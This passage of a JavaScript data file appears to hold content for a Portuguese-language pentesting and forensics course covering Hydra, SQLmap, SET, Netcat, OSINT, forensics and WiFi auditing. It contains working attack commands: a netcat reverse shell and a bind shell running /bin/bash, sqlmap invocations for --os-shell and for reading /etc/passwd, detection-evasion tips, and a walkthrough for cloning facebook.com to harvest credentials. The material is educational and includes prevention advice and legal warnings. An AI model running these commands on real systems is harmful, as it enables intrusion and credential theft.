                  command: 'Salvar Output',
                  description: 'Salva resultados em arquivo',
                  example: '$ hydra -l admin -P passwords.txt ssh://target -o results.txt'
                }
              ]
            },
            {
              subtitle: '⚡ Otimizações',
              optimizations: [
                'Use -t para controlar threads (padrão: 16, max depende do protocolo)',
                'Use -f para parar após encontrar primeira credencial válida',
                'Use -w para adicionar delay entre tentativas (evitar detecção)',
                'Use -e nsr para testar: n=null password, s=senha=usuário, r=reversed username',
                'Combine com ferramentas de geração de wordlists (crunch, cupp)',
                'Use proxies/VPN para evitar bloqueio de IP'
              ]
            }
          ]
        },

        // ========== SQLMAP ==========
        {
          title: '💉 SQLmap + SQL Injection',
          content: `SQLmap é a ferramenta automática de detecção e exploração de SQL Injection mais avançada. Suporta todos os principais SGBDs e dezenas de técnicas de injeção SQL.`,
          subsections: [
            {
              subtitle: '📌 Técnicas de SQL Injection',
              techniques: [
                {
                  name: 'Boolean-based blind',
                  description: 'Infere dados através de respostas True/False da aplicação.'
                },
                {
                  name: 'Time-based blind',
                  description: 'Infere dados medindo tempo de resposta (usando SLEEP(), WAITFOR, etc).'
                },
                {
                  name: 'Error-based',
                  description: 'Extrai dados através de mensagens de erro do banco de dados.'
                },
                {
                  name: 'UNION query-based',
                  description: 'Usa UNION SELECT para extrair dados diretamente.'
                },
                {
                  name: 'Stacked queries',
                  description: 'Executa múltiplas queries separadas por ; (depende do SGBD).'
                },
                {
                  name: 'Out-of-band',
                  description: 'Extrai dados via canal alternativo (DNS, HTTP requests).'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos SQLmap',
              commands: [
                {
                  command: 'Teste Básico',
                  description: 'Testa URL para SQL injection',
                  example: '$ sqlmap -u "http://site.com/page?id=1"'
                },
                {
                  command: 'POST Request',
                  description: 'Testa parâmetros POST',
                  example: '$ sqlmap -u "http://site.com/login" --data="user=admin&pass=test"'
                },
                {
                  command: 'Com Cookie',
                  description: 'Inclui cookies na requisição',
                  example: '$ sqlmap -u "http://site.com/page?id=1" --cookie="PHPSESSID=abc123"'
                },
                {
                  command: 'Listar Databases',
                  description: 'Enumera todos os bancos de dados',
                  example: '$ sqlmap -u "http://site.com/page?id=1" --dbs'
                },
                {
                  command: 'Listar Tabelas',
                  description: 'Enumera tabelas de um database',
                  example: '$ sqlmap -u "http://site.com/page?id=1" -D database_name --tables'
                },
                {
                  command: 'Dump Tabela',
                  description: 'Extrai dados de uma tabela',
                  example: '$ sqlmap -u "http://site.com/page?id=1" -D database -T users --dump'
                },
                {
                  command: 'OS Shell',
                  description: 'Tenta obter shell do sistema operacional',
                  example: '$ sqlmap -u "http://site.com/page?id=1" --os-shell'
                },
                {
                  command: 'Ler Arquivo do Sistema',
                  description: 'Lê arquivo do servidor (se tiver permissões)',
                  example: '$ sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd"'
                },
                {
                  command: 'WAF Detection',
                  description: 'Detecta e tenta bypass de WAF/IPS',
                  example: '$ sqlmap -u "http://site.com/page?id=1" --identify-waf --tamper=space2comment'
                },
                {
                  command: 'Level e Risk',
                  description: 'Aumenta profundidade de testes',
                  example: '$ sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3'
                }
              ]
            },
            {
              subtitle: '🛡️ Tipos de SQL Injection',
              types: [
                {
                  name: 'In-band SQLi',
                  description: 'Dados retornados na mesma resposta HTTP (Error-based, UNION-based)'
                },
                {
                  name: 'Blind SQLi',
                  description: 'Sem feedback direto, infere dados por comportamento (Boolean, Time-based)'
                },
                {
                  name: 'Out-of-band SQLi',
                  description: 'Dados enviados via canal alternativo (DNS exfiltration, HTTP requests)'
                },
                {
                  name: 'Second Order SQLi',
                  description: 'Payload armazenado e executado posteriormente em contexto diferente'
                }
              ]
            },
            {
              subtitle: '🎯 Prevenção',
              prevention: [
                'Use Prepared Statements / Parameterized Queries',
                'Use ORMs (Object-Relational Mapping) modernos',
                'Valide e sanitize TODOS os inputs do usuário',
                'Use whitelist ao invés de blacklist',
                'Implemente least privilege no banco de dados',
                'Use WAF (Web Application Firewall)',
                'Escape caracteres especiais SQL',
                'Nunca exiba erros de SQL em produção'
              ]
            }
          ]
        },

        // ========== SOCIAL ENGINEERING TOOLKIT ==========
        {
          title: '🎭 Social Engineering Toolkit (SET)',
          content: `SET é um framework de código aberto para testes de penetração com foco em engenharia social. Permite simular ataques de phishing, credential harvesting, ataques de mídia infectada e muito mais.`,
          subsections: [
            {
              subtitle: '📌 Módulos Principais',
              modules: [
                {
                  name: 'Spear-Phishing Attack Vectors',
                  description: 'Cria emails de phishing direcionados com anexos maliciosos ou links para credential harvesting.'
                },
                {
                  name: 'Website Attack Vectors',
                  description: 'Clona sites legítimos para capturar credenciais, realiza ataques de mass mailer, etc.'
                },
                {
                  name: 'Infectious Media Generator',
                  description: 'Cria payloads para USB drives que executam automaticamente.'
                },
                {
                  name: 'Create a Payload and Listener',
                  description: 'Gera payloads customizados e configura listeners para conexões reversas.'
                },
                {
                  name: 'Mass Mailer Attack',
                  description: 'Envia emails em massa para campanhas de phishing.'
                },
                {
                  name: 'QRCode Generator Attack',
                  description: 'Cria QR codes maliciosos que redirecionam para páginas de phishing.'
                }
              ]
            },
            {
              subtitle: '🎯 Ataques de Website',
              webattacks: [
                {
                  name: 'Credential Harvester',
                  description: 'Clona site de login e captura credenciais inseridas'
                },
                {
                  name: 'Tabnabbing',
                  description: 'Substitui aba inativa por página de phishing'
                },
                {
                  name: 'Web Jacking',
                  description: 'Injeta iframe invisível para capturar inputs'
                },
                {
                  name: 'Multi-Attack',
                  description: 'Combina múltiplos vetores de ataque'
                }
              ]
            },
            {
              subtitle: '🚀 Workflow Básico',
              workflow: [
                {
                  step: 1,
                  title: 'Iniciar SET',
                  command: '$ sudo setoolkit'
                },
                {
                  step: 2,
                  title: 'Selecionar Attack Vector',
                  description: 'Ex: Website Attack Vectors'
                },
                {
                  step: 3,
                  title: 'Selecionar Método',
                  description: 'Ex: Credential Harvester Attack Method'
                },
                {
                  step: 4,
                  title: 'Clonar Site',
                  description: 'Inserir URL do site a clonar (ex: facebook.com)'
                },
                {
                  step: 5,
                  title: 'Capturar Credenciais',
                  description: 'SET exibe credenciais capturadas em tempo real'
                }
              ]
            },
            {
              subtitle: '⚠️ Avisos Importantes',
              warnings: [
                'Simular phishing sem autorização é CRIME',
                'Use apenas em ambientes controlados para treinamento',
                'Sempre obtenha permissão escrita antes de testes',
                'Não use para fins maliciosos ou não éticos',
                'Ideal para awareness training de funcionários'
              ]
            }
          ]
        },

        // ========== MALTEGO ==========
        {
          title: '🕸️ Maltego',
          content: `Maltego é uma ferramenta de inteligência de código aberto (OSINT) e análise forense que permite visualizar e analisar relações complexas entre pessoas, empresas, domínios, endereços IP, documentos e muito mais.`,
          subsections: [
            {
              subtitle: '📌 Capacidades',
              capabilities: [
                {
                  name: 'Footprinting de Domínios',
                  description: 'Descobre subdomínios, registros DNS, servidores de email, nameservers, etc.'
                },
                {
                  name: 'Análise de Infraestrutura',
                  description: 'Mapeia relacionamentos entre IPs, ASNs, netblocks, hosting providers.'
                },
                {
                  name: 'OSINT de Pessoas',
                  description: 'Coleta informações públicas sobre indivíduos de redes sociais, documentos, etc.'
                },
                {
                  name: 'Análise de Documentos',
                  description: 'Extrai metadata de PDFs, documentos Office, images (EXIF).'
                },
                {
                  name: 'Análise de Redes Sociais',
                  description: 'Mapeia conexões em Twitter, Facebook, LinkedIn, etc.'
                },
                {
                  name: 'Investigação de Malware',
                  description: 'Analisa C&C servers, IPs maliciosos, domínios de phishing.'
                }
              ]
            },
            {
              subtitle: '🔍 Entidades (Entities)',
              entities: [
                'Domain - Domínios e subdomínios',
                'IP Address - Endereços IPv4/IPv6',
                'Netblock - Blocos de IPs',
                'AS Number - Autonomous System Numbers',
                'Person - Pessoas e identidades',
                'Email Address - Endereços de email',
                'Phone Number - Números de telefone',
                'Company - Empresas e organizações',
                'Document - Arquivos e documentos',
                'URL - Links e páginas web',
                'Social Network Handle - Perfis de redes sociais'
              ]
            },
            {
              subtitle: '🔧 Transforms',
              transforms: [
                {
                  name: 'DNS Transforms',
                  description: 'DNS to IP, MX records, NS records, subdomains'
                },
                {
                  name: 'Whois Transforms',
                  description: 'Extrai informações de registro de domínio'
                },
                {
                  name: 'Search Engine Transforms',
                  description: 'Usa Google, Bing, Shodan para descoberta'
                },
                {
                  name: 'Social Network Transforms',
                  description: 'Coleta dados de Twitter, Facebook, LinkedIn'
                },
                {
                  name: 'Metadata Transforms',
                  description: 'Extrai metadata de documentos'
                },
                {
                  name: 'VirusTotal Transforms',
                  description: 'Analisa IPs, domínios e hashes maliciosos'
                }
              ]
            },
            {
              subtitle: '🎯 Casos de Uso',
              usecases: [
                'Reconnaissance para pentesting',
                'Investigação de incidentes de segurança',
                'Threat intelligence e hunting',
                'Due diligence de empresas',
                'Investigação de fraude',
                'Análise de campanhas de phishing',
                'Mapeamento de infrastructure adversária',
                'Digital forensics'
              ]
            }
          ]
        },

        // ========== AUTOPSY ==========
        {
          title: '🔬 Autopsy',
          content: `Autopsy é uma plataforma de forense digital de código aberto usada por investigadores digitais para analisar discos rígidos, smartphones, cartões de memória e outros dispositivos de armazenamento.`,
          subsections: [
            {
              subtitle: '📌 Funcionalidades',
              features: [
                {
                  name: 'Timeline Analysis',
                  description: 'Visualiza eventos em linha do tempo (criação, modificação, acesso de arquivos).'
                },
                {
                  name: 'Keyword Search',
                  description: 'Busca por palavras-chave em todo o sistema de arquivos, incluindo arquivos deletados.'
                },
                {
                  name: 'File System Analysis',
                  description: 'Analisa FAT, NTFS, Ext2/3/4, HFS+, APFS e outros sistemas de arquivos.'
                },
                {
                  name: 'Registry Analysis',
                  description: 'Parseia e analisa registro do Windows.'
                },
                {
                  name: 'Email Analysis',
                  description: 'Analisa arquivos PST, MBOX, EML de clientes de email.'
                },
                {
                  name: 'Web Artifacts',
                  description: 'Extrai histórico de navegação, cookies, downloads, cache.'
                },
                {
                  name: 'Carving de Arquivos',
                  description: 'Recupera arquivos deletados através de file carving.'
                },
                {
                  name: 'Hash Analysis',
                  description: 'Calcula e compara hashes MD5/SHA para verificar integridade.'
                }
              ]
            },
            {
              subtitle: '🔍 Módulos de Análise',
              modules: [
                'Recent Activity - Atividades recentes do usuário',
                'Keyword Search - Busca por termos específicos',
                'Hash Lookup - Verifica hashes contra NSRL, VirusTotal',
                'File Type Identification - Identifica arquivos por magic numbers',
                'Extension Mismatch Detector - Detecta extensões falsas',
                'Embedded File Extractor - Extrai arquivos de documentos',
                'Email Parser - Analisa emails e anexos',
                'Encryption Detection - Detecta volumes criptografados',
                'PhotoRec Carver - Recupera arquivos deletados',
                'Plaso (log2timeline) - Cria super timeline'
              ]
            },
            {
              subtitle: '🎯 Artifacts Analisados',
              artifacts: [
                'Web Browser History (Chrome, Firefox, Safari, Edge)',
                'Email Messages e Attachments',
                'Windows Registry Hives',
                'USB Device History',
                'Prefetch Files (execução de programas)',
                '$Recycle.Bin (lixeira)',
                'Jump Lists e LNK files',
                'Event Logs (Windows)',
                'System Logs (Linux)',
                'Thumbnails e Cache de imagens',
                'WiFi Connection History',
                'Installed Programs'
              ]
            },
            {
              subtitle: '🚀 Workflow de Investigação',
              workflow: [
                {
                  step: 1,
                  title: 'Criar Novo Case',
                  description: 'Definir nome do caso e investigador'
                },
                {
                  step: 2,
                  title: 'Adicionar Data Source',
                  description: 'Imagem de disco (E01, DD), dispositivo físico ou diretório'
                },
                {
                  step: 3,
                  title: 'Executar Ingest Modules',
                  description: 'Selecionar módulos de análise automática'
                },
                {
                  step: 4,
                  title: 'Revisar Resultados',
                  description: 'Analisar timeline, arquivos, artifacts extraídos'
                },
                {
                  step: 5,
                  title: 'Gerar Relatório',
                  description: 'Criar relatório em HTML, Excel ou KML'
                }
              ]
            }
          ]
        },

        // ========== NETCAT ==========
        {
          title: '🔌 Netcat',
          content: `Netcat é conhecido como o "canivete suíço" das ferramentas de rede. É um utilitário extremamente versátil para leitura e escrita de dados através de conexões TCP e UDP.`,
          subsections: [
            {
              subtitle: '📌 Funcionalidades',
              features: [
                {
                  name: 'Port Scanning',
                  description: 'Scan de portas TCP/UDP simples e eficiente.'
                },
                {
                  name: 'Banner Grabbing',
                  description: 'Captura de banners de serviços para identificação de versões.'
                },
                {
                  name: 'File Transfer',
                  description: 'Transferência de arquivos entre máquinas.'
                },
                {
                  name: 'Reverse Shell',
                  description: 'Criação de shells remotas para post-exploitation.'
                },
                {
                  name: 'Bind Shell',
                  description: 'Abertura de shell em porta específica.'
                },
                {
                  name: 'Port Forwarding',
                  description: 'Redirecionamento de portas e proxying.'
                },
                {
                  name: 'Chat Server',
                  description: 'Comunicação básica entre dois hosts.'
                }
              ]
            },
            {
              subtitle: '🚀 Comandos Essenciais',
              commands: [
                {
                  command: 'Port Scan',
                  description: 'Scan de portas TCP',
                  example: '$ nc -zv 192.168.1.1 1-1000'
                },
                {
                  command: 'Banner Grabbing',
                  description: 'Conecta e captura banner de serviço',
                  example: '$ nc 192.168.1.1 80'
                },
                {
                  command: 'Listen em Porta',
                  description: 'Abre listener em porta específica',
                  example: '$ nc -lvp 4444'
                },
                {
                  command: 'Conectar a Host',
                  description: 'Conecta a host e porta',
                  example: '$ nc 192.168.1.1 4444'
                },
                {
                  command: 'Transferir Arquivo (Receiver)',
                  description: 'Recebe arquivo na porta 4444',
                  example: '$ nc -lvp 4444 > received_file.txt'
                },
                {
                  command: 'Transferir Arquivo (Sender)',
                  description: 'Envia arquivo para host remoto',
                  example: '$ nc 192.168.1.1 4444 < file.txt'
                },
                {
                  command: 'Reverse Shell (Attacker)',
                  description: 'Listener para receber conexão reversa',
                  example: '$ nc -lvp 4444'
                },
                {
                  command: 'Reverse Shell (Victim)',
                  description: 'Conecta e envia shell para attacker',
                  example: '$ nc 192.168.1.100 4444 -e /bin/bash'
                },
                {
                  command: 'Bind Shell',
                  description: 'Abre shell em porta 4444',
                  example: '$ nc -lvp 4444 -e /bin/bash'
                },
                {
                  command: 'UDP Mode',
                  description: 'Opera em modo UDP',
                  example: '$ nc -u -lvp 53'
                },
                {
                  command: 'HTTP Request',
                  description: 'Envia requisição HTTP manual',
                  example: '$ echo -e "GET / HTTP/1.1\\nHost: example.com\\n\\n" | nc example.com 80'
                }
              ]
            },
            {
              subtitle: '🎯 Casos de Uso',
              usecases: [
                'Post-exploitation - manter acesso após compromisso',
                'Bypass de firewall através de conexões reversas',
                'Transferência de arquivos em redes sem ferramentas',
                'Debugging de aplicações de rede',
                'Testing de conectividade em portas específicas',
                'Criação de backdoors simples',
                'Pivoting e port forwarding',
                'Troubleshooting de serviços de rede'
              ]
            }
          ]
        },

        // ========== COLETA DE INFORMAÇÕES ==========
        {
          title: '🔎 Coleta de Informações (Reconnaissance)',
          content: `A coleta de informações é a primeira fase de qualquer teste de penetração. Envolve mapear redes, identificar hosts, escanear portas e coletar o máximo de informações sobre o alvo antes de qualquer ataque.`,
          subsections: [
            {
              subtitle: '📌 Tipos de Reconnaissance',
              types: [
                {
                  name: 'Passive Reconnaissance',
                  description: 'Coleta de informações sem interação direta com o alvo. Usa fontes públicas (OSINT).',
                  tools: 'Google Dorking, Shodan, Maltego, theHarvester, WHOIS, DNS lookups'
                },
                {
                  name: 'Active Reconnaissance',
                  description: 'Interação direta com o alvo através de scans, pings e enumeração.',
                  tools: 'Nmap, Nessus, Nikto, Netcat, DNS zone transfers'
                }
              ]
            },
            {
              subtitle: '🌐 Passive OSINT',
              osint: [
                {
                  technique: 'Google Dorking',
                  description: 'Uso de operadores avançados do Google para encontrar informações sensíveis',
                  examples: [
                    'site:example.com filetype:pdf - Arquivos PDF do domínio',
                    'intitle:"index of" site:example.com - Diretórios listados',
                    'inurl:admin site:example.com - Páginas de admin',
                    'site:example.com intext:"password" - Páginas com senhas'
                  ]
                },
                {
                  technique: 'Shodan',
                  description: 'Motor de busca para dispositivos conectados à internet',
                  examples: [
                    'hostname:example.com - Dispositivos do domínio',
                    'org:"Company Name" - Dispositivos da organização',
                    'port:22 country:BR - Servidores SSH no Brasil',
                    'webcam - Webcams expostas'
                  ]
                },
                {
                  technique: 'WHOIS Lookup',
                  description: 'Informações de registro de domínio',
                  command: '$ whois example.com'
                },
                {
                  technique: 'DNS Enumeration',
                  description: 'Coleta de registros DNS',
                  commands: [
                    '$ dig example.com ANY',
                    '$ nslookup -type=mx example.com',
                    '$ host -t ns example.com'
                  ]
                },
                {
                  technique: 'theHarvester',
                  description: 'Coleta emails, subdomínios, IPs',
                  command: '$ theHarvester -d example.com -b all'
                },
                {
                  technique: 'Wayback Machine',
                  description: 'Versões antigas de sites',
                  url: 'archive.org/web'
                }
              ]
            },
            {
              subtitle: '🎯 Active Enumeration',
              enumeration: [
                {
                  technique: 'Port Scanning',
                  description: 'Descoberta de portas abertas',
                  tools: 'Nmap, Masscan, Unicornscan'
                },
                {
                  technique: 'Service Detection',
                  description: 'Identificação de serviços e versões',
                  command: 'nmap -sV -A target'
                },
                {
                  technique: 'OS Fingerprinting',
                  description: 'Identificação do sistema operacional',
                  command: 'nmap -O target'
                },
                {
                  technique: 'Subdomain Enumeration',
                  description: 'Descoberta de subdomínios',
                  tools: 'Sublist3r, Amass, dnsrecon, fierce'
                },
                {
                  technique: 'Web Directory Enumeration',
                  description: 'Descoberta de diretórios e arquivos',
                  tools: 'dirb, gobuster, dirbuster, ffuf'
                },
                {
                  technique: 'SNMP Enumeration',
                  description: 'Extração de informações via SNMP',
                  tools: 'snmpwalk, snmp-check, onesixtyone'
                },
                {
                  technique: 'SMB Enumeration',
                  description: 'Enumeração de shares e usuários Windows',
                  tools: 'enum4linux, smbclient, crackmapexec'
                }
              ]
            },
            {
              subtitle: '🛠️ Ferramentas Essenciais',
              tools: [
                'Nmap - Scanner de rede e portas',
                'Maltego - OSINT e visualização de relações',
                'theHarvester - Coleta de emails, subdomínios',
                'Recon-ng - Framework de reconnaissance',
                'Shodan - Busca de dispositivos expostos',
                'Censys - Análise de certificados e hosts',
                'Sublist3r - Enumeração de subdomínios',
                'Amass - Asset discovery',
                'Gobuster - Brute force de diretórios',
                'WhatWeb - Fingerprinting de tecnologias web'
              ]
            }
          ]
        },

        // ========== ANÁLISE DE VULNERABILIDADES ==========
        {
          title: '🛡️ Análise de Vulnerabilidades',
          content: `Processo de identificar, classificar e priorizar vulnerabilidades em sistemas, redes e aplicações. Essencial para manter a segurança antes que atacantes possam explorar falhas.`,
          subsections: [
            {
              subtitle: '📌 Metodologia',
              methodology: [
                {
                  phase: '1. Asset Discovery',
                  description: 'Identificar todos os ativos (servidores, aplicações, dispositivos)'
                },
                {
                  phase: '2. Vulnerability Identification',
                  description: 'Scan automatizado e análise manual para descobrir vulnerabilidades'
                },
                {
                  phase: '3. Vulnerability Analysis',
                  description: 'Validar e entender cada vulnerabilidade encontrada'
                },
                {
                  phase: '4. Risk Assessment',
                  description: 'Classificar vulnerabilidades por criticidade (CVSS Score)'
                },
                {
                  phase: '5. Remediation',
                  description: 'Desenvolver e implementar correções'
                },
                {
                  phase: '6. Reporting',
                  description: 'Documentar findings e recomendações'
                },
                {
                  phase: '7. Verification',
                  description: 'Revalidar após correções aplicadas'
                }
              ]
            },
            {
              subtitle: '🔍 Tipos de Vulnerabilidades',
              vulnerabilities: [
                {
                  category: 'Network Vulnerabilities',
                  examples: [
                    'Portas desnecessárias abertas',
                    'Protocolos inseguros (Telnet, FTP, HTTP)',
                    'Falta de segmentação de rede',
                    'Configurações fracas de firewall',
                    'Redes WiFi mal configuradas'
                  ]
                },
                {
                  category: 'Operating System Vulnerabilities',
                  examples: [
                    'Patches de segurança não aplicados',
                    'Contas com senhas padrão',
                    'Serviços desnecessários rodando',
                    'Permissões excessivas de arquivos',
                    'Kernel desatualizado'
                  ]
                },
                {
                  category: 'Web Application Vulnerabilities',
                  examples: [
                    'SQL Injection',
                    'Cross-Site Scripting (XSS)',
                    'CSRF, XXE, SSRF',
                    'Broken Authentication',
                    'Security Misconfiguration',
                    'Sensitive Data Exposure'
                  ]
                },
                {
                  category: 'Configuration Vulnerabilities',
                  examples: [
                    'Configurações padrão não alteradas',
                    'Headers de segurança ausentes',
                    'Diretórios com listagem habilitada',
                    'Backup files acessíveis',
                    'Debug mode em produção'
                  ]
                }
              ]
            },
            {
              subtitle: '🛠️ Ferramentas de Scan',
              scanners: [
                {
                  name: 'Nessus',
                  type: 'Commercial',
                  description: 'Scanner profissional com 150k+ plugins'
                },
                {
                  name: 'OpenVAS',
                  type: 'Open Source',
                  description: 'Fork open source do Nessus antigo'
                },
                {
                  name: 'Qualys',
                  type: 'Cloud-based',
                  description: 'Plataforma cloud de scanning'
                },
                {
                  name: 'Acunetix',
                  type: 'Web Apps',
                  description: 'Especializado em vulnerabilidades web'
                },
                {
                  name: 'Burp Suite',
                  type: 'Web Apps',
                  description: 'Proxy para testes de aplicações web'
                },
                {
                  name: 'OWASP ZAP',
                  type: 'Open Source',
                  description: 'Scanner web gratuito'
                },
                {
                  name: 'Nikto',
                  type: 'Web Servers',
                  description: 'Scanner de servidores web'
                },
                {
                  name: 'Lynis',
                  type: 'Linux/Unix',
                  description: 'Auditoria de hardening de sistemas'
                }
              ]
            },
            {
              subtitle: '📊 CVSS - Common Vulnerability Scoring System',
              cvss: [
                {
                  score: '9.0-10.0',
                  severity: 'Critical',
                  description: 'Requer ação imediata, exploração trivial'
                },
                {
                  score: '7.0-8.9',
                  severity: 'High',
                  description: 'Correção urgente necessária'
                },
                {
                  score: '4.0-6.9',
                  severity: 'Medium',
                  description: 'Correção deve ser priorizada'
                },
                {
                  score: '0.1-3.9',
                  severity: 'Low',
                  description: 'Correção quando possível'
                }
              ]
            }
          ]
        },

        // ========== ANÁLISE FORENSE ==========
        {
          title: '🔬 Análise Forense Digital',
          content: `Ciência de coletar, preservar, analisar e apresentar evidências digitais após um incidente de segurança. Usado para investigações de crimes cibernéticos, violações de dados e análise de malware.`,
          subsections: [
            {
              subtitle: '📌 Princípios Fundamentais',
              principles: [
                {
                  principle: 'Preservação',
                  description: 'Evidências digitais devem ser preservadas em estado original. Use write blockers e crie imagens forenses.'
                },
                {
                  principle: 'Cadeia de Custódia',
                  description: 'Documentar quem teve acesso às evidências, quando e por quê. Essencial para validade legal.'
                },
                {
                  principle: 'Documentação',
                  description: 'Tudo deve ser documentado: procedimentos, ferramentas usadas, findings, screenshots.'
                },
                {
                  principle: 'Análise',
                  description: 'Usar ferramentas forenses para extrair e analisar dados sem modificar originais.'
                },
                {
                  principle: 'Reporting',
                  description: 'Criar relatórios claros, técnicos e compreensíveis para não-técnicos.'
                }
              ]
            },
            {
              subtitle: '🛠️ Ferramentas Forenses',
              tools: [
                {
                  name: 'Autopsy / Sleuth Kit',
                  description: 'Plataforma open source para análise de disco e sistema de arquivos'
                },
                {
                  name: 'FTK (Forensic Toolkit)',
                  description: 'Suite comercial completa de ferramentas forenses'
                },
                {
                  name: 'EnCase',
                  description: 'Ferramenta forense profissional líder de mercado'
                },
                {
                  name: 'Volatility',
                  description: 'Framework para análise de memória RAM'
                },
                {
                  name: 'Wireshark',
                  description: 'Análise forense de tráfego de rede'
                },
                {
                  name: 'SIFT Workstation',
                  description: 'Distribuição Linux com ferramentas forenses'
                },
                {
                  name: 'X-Ways Forensics',
                  description: 'Ferramenta avançada de análise forense'
                },
                {
                  name: 'Bulk Extractor',
                  description: 'Extração de features sem parsing de sistema de arquivos'
                }
              ]
            },
            {
              subtitle: '🔍 Tipos de Evidências',
              evidence: [
                {
                  type: 'Disk Forensics',
                  description: 'Análise de discos rígidos, SSDs, pen drives',
                  artifacts: 'Arquivos deletados, timestamps, metadata, registry, logs'
                },
                {
                  type: 'Memory Forensics',
                  description: 'Análise de dump de memória RAM',
                  artifacts: 'Processos running, conexões de rede, senhas em plaintext, malware em memória'
                },
                {
                  type: 'Network Forensics',
                  description: 'Análise de tráfego de rede capturado',
                  artifacts: 'Pacotes, sessões, arquivos transferidos, C&C communication'
                },
                {
                  type: 'Mobile Forensics',
                  description: 'Análise de smartphones e tablets',
                  artifacts: 'SMS, call logs, GPS, apps data, backups'
                },
                {
                  type: 'Cloud Forensics',
                  description: 'Análise de serviços cloud',
                  artifacts: 'Logs de acesso, API calls, storage objects'
                }
              ]
            },
            {
              subtitle: '📋 Processo de Investigação',
              process: [
                {
                  step: 1,
                  phase: 'Identification',
                  description: 'Identificar que incidente ocorreu e quais sistemas foram afetados'
                },
                {
                  step: 2,
                  phase: 'Preservation',
                  description: 'Isolar sistemas, criar imagens forenses, documentar estado'
                },
                {
                  step: 3,
                  phase: 'Collection',
                  description: 'Coletar evidências: disk images, memory dumps, logs, network captures'
                },
                {
                  step: 4,
                  phase: 'Examination',
                  description: 'Processar evidências com ferramentas forenses'
                },
                {
                  step: 5,
                  phase: 'Analysis',
                  description: 'Analisar dados extraídos para construir timeline e determinar escopo'
                },
                {
                  step: 6,
                  phase: 'Reporting',
                  description: 'Documentar findings, timeline, IOCs, recomendações'
                },
                {
                  step: 7,
                  phase: 'Presentation',
                  description: 'Apresentar findings para stakeholders ou tribunal'
                }
              ]
            },
            {
              subtitle: '🎯 Artifacts Importantes',
              artifacts: [
                'Windows Registry - Configurações, programas instalados, USB devices',
                'Event Logs - Logins, execuções, erros',
                'Prefetch - Evidência de execução de programas',
                'Browser History - Sites visitados, downloads, cookies',
                '$MFT (Master File Table) - Metadata de todos os arquivos NTFS',
                'LNK Files - Arquivos recentemente acessados',
                'Recycle Bin - Arquivos deletados',
                'Email PST/OST - Comunicações',
                'Thumbnails - Imagens visualizadas',
                'Memory Dump - Estado da memória no momento da captura'
              ]
            }
          ]
        },

        // ========== AUDITORIAS WIFI ==========
        {
          title: '📶 Auditorias de Rede Sem Fio (WiFi)',
          content: `Avaliação de segurança de redes WiFi para identificar vulnerabilidades em configurações, criptografia e protocolos de autenticação. Essencial para garantir que redes wireless estejam adequadamente protegidas.`,
          subsections: [
            {
              subtitle: '📌 Protocolos de Segurança WiFi',
              protocols: [
                {
                  name: 'WEP (Wired Equivalent Privacy)',
                  status: '❌ OBSOLETO - NÃO USAR',
                  description: 'Quebrado desde 2001. Pode ser crackeado em minutos com Aircrack-ng.',
                  vulnerabilities: 'IV collision, weak RC4, reuse de keystream'
                },
                {
                  name: 'WPA (Wi-Fi Protected Access)',
                  status: '⚠️ INSEGURO',
                  description: 'Melhoria sobre WEP mas ainda vulnerável. Usa TKIP.',
                  vulnerabilities: 'TKIP attacks, dictionary attacks em PSK fraco'
                },
                {
                  name: 'WPA2-Personal (PSK)',
                  status: '✅ ACEITÁVEL',
                  description: 'AES-CCMP, seguro se senha forte. Vulnerável a KRACK.',
                  vulnerabilities: 'Brute-force se senha fraca, KRACK attack, PMKID attack'
                },
                {
                  name: 'WPA2-Enterprise (802.1X)',
                  status: '✅ RECOMENDADO',
                  description: 'Autenticação por usuário via RADIUS. Mais seguro.',
                  vulnerabilities: 'Depende de configuração do RADIUS, Evil Twin'
                },
                {
                  name: 'WPA3-Personal (SAE)',
                  status: '✅ MAIS SEGURO',
                  description: 'Simultaneous Authentication of Equals. Protege contra offline dictionary.',
                  vulnerabilities: 'Dragonblood (CVE-2019-13377), downgrade para WPA2'
                },
                {
                  name: 'WPA3-Enterprise',
                  status: '✅ MAIS SEGURO',
                  description: 'Criptografia de 192 bits, Protected Management Frames obrigatório.',
                  vulnerabilities: 'Requer suporte de hardware moderno'
                }
              ]
            },
            {
              subtitle: '🔍 Vulnerabilidades Comuns',
              vulnerabilities: [
                {
                  vuln: 'WPS (Wi-Fi Protected Setup) Habilitado',
                  severity: 'CRITICAL',
                  description: 'WPS PIN pode ser quebrado por brute-force em horas (Reaver, Bully).',
                  fix: 'Desabilitar WPS completamente no roteador'
                },
                {
                  vuln: 'Senha WPA2-PSK Fraca',
                  severity: 'HIGH',
                  description: 'Senhas curtas ou comuns podem ser quebradas offline.',
                  fix: 'Use senhas com 20+ caracteres aleatórios'
                },
                {
                  vuln: 'SSID Padrão',
                  severity: 'MEDIUM',
                  description: 'SSIDs padrão revelam modelo do roteador e possíveis vulnerabilidades.',
                  fix: 'Alterar SSID para nome customizado'
                },
                {
                  vuln: 'Firmware Desatualizado',
                  severity: 'HIGH',
                  description: 'Roteadores com firmware antigo podem ter vulnerabilidades conhecidas.',
                  fix: 'Atualizar firmware regularmente'
                },
                {
                  vuln: 'Admin Interface Exposta',
                  severity: 'HIGH',
                  description: 'Interface de administração acessível pela rede WiFi.',
                  fix: 'Acessar admin apenas via cabo, ou usar ACLs'
                },
                {
                  vuln: 'Evil Twin Attack',
                  severity: 'HIGH',
                  description: 'Atacante cria AP falso com mesmo SSID para capturar credenciais.',
                  fix: 'Usar WPA2-Enterprise, educar usuários, usar certificados'
                }
              ]
            },
            {
              subtitle: '🛠️ Ferramentas de Auditoria',
              tools: [
                {
                  name: 'Aircrack-ng Suite',
                  description: 'Conjunto completo: airodump, aireplay, aircrack, airbase',
                  uses: 'Capture handshakes, crack WEP/WPA, deauth, fake AP'
                },
                {
                  name: 'Wifite',
                  description: 'Ferramenta automática que usa aircrack-ng',
                  uses: 'Auditoria automatizada de múltiplas redes'
                },
                {
                  name: 'Reaver / Bully',
                  description: 'Quebra WPS PIN por brute-force',
                  uses: 'Exploração de WPS habilitado'
                },
                {
                  name: 'Hashcat',
                  description: 'Quebra handshakes WPA2 capturados',
                  uses: 'Offline cracking com GPU'
                },
                {
                  name: 'Wireshark',
                  description: 'Análise de tráfego WiFi capturado',
                  uses: 'Análise de pacotes 802.11, deauth frames'
                },
                {
                  name: 'Kismet',
                  description: 'Detector e sniffer de redes wireless',
                  uses: 'War driving, detecção de rogue APs'
                },
                {
                  name: 'WiFi Pineapple',
                  description: 'Hardware dedicado para auditorias WiFi',
